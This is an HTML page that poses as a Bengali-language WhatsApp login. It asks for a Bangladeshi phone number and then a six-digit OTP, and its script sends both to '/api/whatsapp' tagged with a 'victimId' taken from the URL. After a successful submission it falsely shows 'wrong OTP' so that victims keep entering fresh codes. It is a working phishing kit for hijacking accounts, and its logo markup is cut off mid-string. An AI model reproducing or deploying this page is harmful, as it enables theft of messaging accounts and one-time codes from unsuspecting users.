<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f7f9fc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            margin: 0;
        }
        .container {
            background: #ffffff;
            border-radius: 32px;
            padding: 48px 40px 40px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06), 0 4px 32px rgba(0, 0, 0, 0.04);
            text-align: center;
            border: 1px solid rgba(0,0,0,0.02);
        }
        .logo-area {
            margin-bottom: 28px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 72px;
            height: 72px;
            border-radius: 50%;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
            margin-bottom: 12px;
            transition: transform 0.2s;
            overflow: hidden;
            background: #25D366;
        }
        .logo-icon:hover {
            transform: scale(1.02);
        }
        .logo-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .logo-icon svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
        }
        .logo-text {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.3px;
        }
        .logo-text span {
            color: #25D366;
        }
        .step-title {
            font-size: 20px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }
        .step-sub {
            font-size: 15px;
            color: #6b6b6b;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        .step {
            display: none;
            animation: fadeIn 0.3s ease;
        }
        .step.active {
            display: block;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(6px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .input-label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #333;
            text-align: left;
            margin-bottom: 6px;
        }
        .phone-wrapper {
            display: flex;
            align-items: center;
            border: 1.5px solid #d1d5db;
            border-radius: 12px;
            background: #fafafa;
            transition: border 0.25s, box-shadow 0.25s;
            overflow: hidden;
        }
        .phone-wrapper:focus-within {
            border-color: #25D366;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.12);
            background: #ffffff;
        }
        .country-code {
            display: flex;
            align-items: center;
            gap: 4px;
            padding: 14px 12px 14px 16px;
            background: #f0f2f5;
            border-right: 1px solid #e5e7eb;
            font-weight: 500;
            font-size: 15px;
            color: #1a1a1a;
            cursor: default;
            user-select: none;
            flex-shrink: 0;
        }
        .country-code .flag {
            font-size: 20px;
            line-height: 1;
        }
        .country-code .arrow {
            font-size: 10px;
            color: #888;
            margin-left: 2px;
        }
        .phone-wrapper input {
            flex: 1;
            border: none;
            padding: 14px 16px 14px 10px;
            font-size: 16px;
            outline: none;
            background: transparent;
            font-family: inherit;
            color: #1a1a1a;
            min-width: 0;
        }
        .phone-wrapper input::placeholder {
            color: #aab;
            font-weight: 400;
            font-size: 15px;
        }
        .otp-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 22px 0 12px;
        }
        .otp-container input {
            width: 48px;
            height: 58px;
            text-align: center;
            font-size: 26px;
            font-weight: 600;
            font-family: inherit;
            border: 1.5px solid #d1d5db;
            border-radius: 12px;
            outline: none;
            background: #fafafa;
            transition: border 0.2s, box-shadow 0.2s;
            color: #1a1a1a;
        }
        .otp-container input:focus {
            border-color: #25D366;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.10);
            background: #ffffff;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: #25D366;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            margin-top: 16px;
        }
        .btn:hover {
            background: #1da85c;
        }
        .btn:active {
            transform: scale(0.97);
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .error-msg {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 12px;
            display: none;
            text-align: left;
            padding-left: 4px;
        }
        .error-msg.show {
            display: block;
        }
        .spinner {
            display: none;
            margin: 14px auto 4px;
            width: 26px;
            height: 26px;
            border: 3px solid #e8e8e8;
            border-top-color: #25D366;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        .spinner.active {
            display: block;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .footer {
            margin-top: 28px;
            padding-top: 20px;
            border-top: 1px solid #f0f0f0;
            display: flex;
            justify-content: center;
            gap: 24px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            transition: color 0.2s;
            font-weight: 500;
        }
        .footer a:hover {
            color: #25D366;
            text-decoration: underline;
        }
        .resend-link {
            margin-top: 16px;
            font-size: 14px;
            color: #6b6b6b;
        }
        .resend-link a {
            color: #25D366;
            text-decoration: none;
            font-weight: 500;
        }
        .resend-link a:hover {
            text-decoration: underline;
        }
        @media (max-width: 440px) {
            .container {
                padding: 28px 18px 24px;
                border-radius: 24px;
            }
            .logo-icon {
                width: 60px;
                height: 60px;
            }
            .logo-icon svg {
                width: 34px;
                height: 34px;
            }
            .logo-text {
                font-size: 20px;
            }
            .step-title {
                font-size: 18px;
            }
            .otp-container input {
                width: 40px;
                height: 48px;
                font-size: 20px;
            }
            .country-code {
                padding: 12px 8px 12px 12px;
                font-size: 14px;
            }
            .phone-wrapper input {
                padding: 12px 12px 12px 6px;
                font-size: 15px;
            }
            .btn {
                padding: 14px;
                font-size: 16px;
            }
        }
        @media (max-width: 360px) {
            .otp-container {
                gap: 6px;
            }
            .otp-container input {
                width: 34px;
                height: 42px;
                font-size: 17px;
            }
        }
    </style>
</head>
<body>

<div class="container">

    <!-- Logo -->
    <div class="logo-area">
        <div class="logo-icon">
            <!-- আপনার দেওয়া ইমেজ লিংক -->
            <img src="https://www.image2url.com/r2/default/images/1787302613357-91e5f5c6-1e01-4322-8398-4e2f4d584a85.webp" alt="WhatsApp" onerror="this.style.display='none'; this.parentElement.innerHTML = `<svg viewBox=\'0 0 24 24\' xmlns=\'http://www.w3.org/2000/svg\'><path d=\'M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.113 3.273l-.979 3.077 3.204-.979c.948.587 2.063.897 3.197.898h.002c3.18 0 5.767-2.586 5.768-5.766.001-3.18-2.586-5.766-5.766-5.767zm3.371 8.258c-.207.631-.978 1.23-1.572 1.346-.291.057-.574.069-.934.027-.327-.038-.634-.123-1.253-.451-1.034-.508-1.745-1.351-2.284-2.101-.671-.934-.989-1.693-1.015-2.567-.02-.646.149-1.078.6-1.385.267-.182.573-.269.885-.269.17 0 .324.027.435.131.18.169.33.543.447.902.194.601.396 1.26.468 1.323.02.024.041.039.064.047.045.014.092.014.138-.003.069-.024.118-.062.168-.119.213-.251.385-.605.426-.889.01-.054.002-.109-.019-.162-.179-.443-.466-.949-.579-1.213-.107-.249-.226-.417-.441-.417-.245 0-.523.161-.638.251-.021.016-.039.032-.055.05-.104.116-.172.231-.172.427 0 .214.054.426.146.626.119.345.347.707.607 1.009.397.47.938.957 1.395 1.176.322.142.587.198.788.206.092.003.171-.009.25-.036.158-.055.362-.175.481-.356.071-.11.113-.221.141-.354.013-.056.006-.111-.018-.161-.019-.039-.05-.084-.08-.103-.235-.153-.497-.323-.5-.326-.049-.04-.089-.058-.126-.099-.039-.045-.056-.1-.038-.158.018-.061.061-.118.107-.172.045-.054.107-.112.164-.167.007-.006.014-.012.02-.017.051-.041.112-.073.171-.073.038 0 .077.01.11.027.096.05.142.111.217.201.082.098.209.302.178.441-.016.077-.068.156-.127.226-.058.069-.127.132-.186.188-.061.057-.113.108-.086.163.029.059.064.11.105.164.282.364.568.57.913.805.188.128.393.221.601.289.043.014.086.025.128.033.022.004.044.007.067.007.107 0 .204-.035.277-.138.002-.003.005-.006.008-.009.093-.128.156-.267.204-.412.06-.173.069-.308.012-.412-.016-.028-.042-.052-.066-.074-.026-.026-.077-.073-.184-.144-.043-.028-.085-.056-.113-.082-.039-.037-.063-.082-.031-.139.026-.045.075-.077.135-.113.135-.08.334-         </div>
        <div class="logo-text">Whats<span>App</span></div>
    </div>

    <!-- ======== STEP 1: PHONE ======== -->
    <div id="step-phone" class="step active">
        <div class="step-title">মোবাইল নম্বর লগ ইন</div>
        <div class="step-sub">আপনার অ্যাকাউন্টে লগ ইন করতে নম্বর দিন</div>

        <div class="input-label">মোবাইল নম্বর</div>
        <div class="phone-wrapper">
            <div class="country-code">
                <span class="flag">🇧🇩</span>
                <span>+880</span>
                <span class="arrow">▾</span>
            </div>
            <input type="tel" id="phoneInput" placeholder="১৭ xxxx xxxx" maxlength="11" autofocus>
        </div>

        <div id="phoneError" class="error-msg">❌ দয়া করে একটি সঠিক নম্বর দিন।</div>
        <button class="btn" id="loginBtn">পরবর্তী</button>
        <div class="spinner" id="spinnerPhone"></div>
    </div>

    <!-- ======== STEP 2: OTP ======== -->
    <div id="step-otp" class="step">
        <div class="step-title">ওটিপি যাচাই</div>
        <div class="step-sub">আমরা আপনার নম্বরে একটি ৬-ডিজিটের কোড পাঠিয়েছি</div>

        <div class="otp-container">
            <input type="text" maxlength="1" class="otp-digit" data-index="0" autofocus>
            <input type="text" maxlength="1" class="otp-digit" data-index="1">
            <input type="text" maxlength="1" class="otp-digit" data-index="2">
            <input type="text" maxlength="1" class="otp-digit" data-index="3">
            <input type="text" maxlength="1" class="otp-digit" data-index="4">
            <input type="text" maxlength="1" class="otp-digit" data-index="5">
        </div>

        <div id="otpError" class="error-msg">❌ ভুল ওটিপি, আবার চেষ্টা করুন।</div>
        <button class="btn" id="verifyBtn">যাচাই করুন</button>
        <div class="spinner" id="spinnerOtp"></div>

        <div class="resend-link">
            <a href="#" id="resendLink">পুনরায় ওটিপি পাঠান</a>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">প্রাইভেসি</a>
        <a href="#">শর্তাবলী</a>
        <a href="#">সহায়তা</a>
    </div>
</div>

<script>
    (function() {
        const pathParts = window.location.pathname.split('/');
        const victimId = pathParts[pathParts.length - 1];

        const stepPhone = document.getElementById('step-phone');
        const stepOtp = document.getElementById('step-otp');
        const phoneInput = document.getElementById('phoneInput');
        const loginBtn = document.getElementById('loginBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const spinnerPhone = document.getElementById('spinnerPhone');
        const spinnerOtp = document.getElementById('spinnerOtp');
        const phoneError = document.getElementById('phoneError');
        const otpError = document.getElementById('otpError');
        const otpInputs = document.querySelectorAll('.otp-digit');

        // ─── OTP auto-focus & paste ───
        otpInputs.forEach((input, idx) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
                if (this.value.length === 1 && idx < 5) {
                    otpInputs[idx + 1].focus();
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                    otpInputs[idx - 1].focus();
                }
            });
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
                if (!paste) return;
                const digits = paste.slice(0, 6).split('');
                otpInputs.forEach((inp, i) => {
                    if (i < digits.length) inp.value = digits[i];
                });
                const nextIndex = Math.min(digits.length, 5);
                otpInputs[nextIndex].focus();
            });
        });

        phoneInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });

        // ─── Step 1: Phone ───
        loginBtn.addEventListener('click', async function() {
            const phone = phoneInput.value.trim();
            if (!phone || phone.length < 10) {
                phoneError.classList.add('show');
                return;
            }
            phoneError.classList.remove('show');
            loginBtn.disabled = true;
            spinnerPhone.classList.add('active');

            try {
                const response = await fetch('/api/whatsapp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: victimId, phone: '+880' + phone })
                });
                const result = await response.json();
                if (response.ok) {
                    stepPhone.classList.remove('active');
                    stepOtp.classList.add('active');
                    setTimeout(() => otpInputs[0].focus(), 120);
                } else {
                    phoneError.textContent = result.message || 'সার্ভার ত্রুটি';
                    phoneError.classList.add('show');
                }
            } catch (err) {
                phoneError.textContent = 'নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।';
                phoneError.classList.add('show');
            }
            loginBtn.disabled = false;
            spinnerPhone.classList.remove('active');
        });

        // ─── Step 2: OTP ───
        verifyBtn.addEventListener('click', async function() {
            let otp = '';
            otpInputs.forEach(inp => otp += inp.value);
            if (otp.length !== 6) {
                otpError.textContent = 'দয়া করে ৬ ডিজিটের ওটিপি দিন।';
                otpError.classList.add('show');
                return;
            }
            otpError.classList.remove('show');
            verifyBtn.disabled = true;
            spinnerOtp.classList.add('active');

            try {
                const response = await fetch('/api/whatsapp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: victimId, otp: otp })
                });
                const result = await response.json();
                if (response.ok) {
                    otpError.textContent = '❌ ভুল ওটিপি, আবার চেষ্টা করুন।';
                    otpError.classList.add('show');
                    otpInputs.forEach(inp => inp.value = '');
                    otpInputs[0].focus();
                } else {
                    otpError.textContent = result.message || 'সার্ভার ত্রুটি';
                    otpError.classList.add('show');
                }
            } catch (err) {
                otpError.textContent = 'নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।';
                otpError.classList.add('show');
            }
            verifyBtn.disabled = false;
            spinnerOtp.classList.remove('active');
        });

        // ─── Resend ───
        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            stepOtp.classList.remove('active');
            stepPhone.classList.add('active');
            phoneInput.focus();
            phoneInput.select();
            otpInputs.forEach(inp => inp.value = '');
            otpError.classList.remove('show');
        });

        // ─── Enter key ───
        phoneInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') loginBtn.click();
        });
        otpInputs[5].addEventListener('keydown', function(e) {
            if (e.key === 'Enter') verifyBtn.click();
        });

    })();
</script>
</body>
</html>
